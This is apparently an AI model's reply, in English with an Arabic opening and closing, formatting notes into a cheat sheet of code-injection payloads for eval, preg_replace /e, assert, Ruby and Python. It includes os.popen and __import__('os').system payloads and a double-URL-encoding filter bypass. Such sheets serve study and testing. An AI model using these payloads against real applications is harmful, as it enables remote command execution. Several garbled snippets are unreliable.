إليك تنظيم النقاط بشكل نصي عادي ومنظم:

---

### **Command Injection & Eval Exploitation**

#### **1. Eval Exploit**
- **Basic Eval Exploit**:
  ```bash
  it’s eval() exploit
  ”.system(”ls”).
  ```

#### **2. PHP Preg_Replace with /e Modifier**
- **Using `/e` Modifier**:
  ```bash
  preg_replace(find, do/e, here)
  ```
  - The `/e` modifier allows the `do` part to be evaluated as PHP code.

#### **3. Assert Function Exploit**
- **Assert Function**:
  ```bash
  assert function compares val1 and val2; if one is a system command, it executes.
  ```

#### **4. Eval Function with String Concatenation**
- **String Concatenation in Eval**:
  ```bash
  after “ that eval function, just hacher”%2b”test”%2b” (with + URL encoding)
  ```

#### **5. Ruby Eval Exploit**
- **Ruby Eval**:
  ```bash
  @message = eval "\\"Hello "+params['username']+"\\""
  ```
  - In Ruby, to execute OS commands, use backticks: `` `command` ``.

#### **6. Python Eval Exploit**
- **Python Eval**:
  ```bash
  "%2bstr(os.popen("ls").read())%2b"
  ```
  - `eval` will execute `os.popen("ls").read()`. The `.read()` method converts the object returned by `os.popen()` to text.

#### **7. Python OS Module Exploit**
- **Using `__import__`**:
  ```bash
  __import__('os').system('ls')
  ```

#### **8. Bypassing Backend Validation**
- **Double URL Encoding**:
  ```bash
  Use `str(__import__('os').popen('ls').read())`, but if the backend validates `/`, use double URL encoding.
  ```

---

### **How to Use This Information**
1. **Eval Exploit**:
   - Exploit `eval()` functions by injecting system commands.

2. **PHP Preg_Replace**:
   - Use the `/e` modifier in `preg_replace` to execute PHP code.

3. **Assert Function**:
   - Use the `assert` function to execute commands if one of the compared values is a system command.

4. **String Concatenation**:
   - Concatenate strings in `eval` functions to inject commands.

5. **Ruby Eval**:
   - Use backticks in Ruby to execute OS commands within `eval`.

6. **Python Eval**:
   - Inject Python code using `eval` to execute OS commands.

7. **OS Module**:
   - Use `__import__('os').system('ls')` to execute commands in Python.

8. **Bypass Validation**:
   - Use double URL encoding to bypass backend validation on special characters.

---

إذا كنت بحاجة إلى أي تعديلات إضافية، فلا تتردد في طلبها! 😊
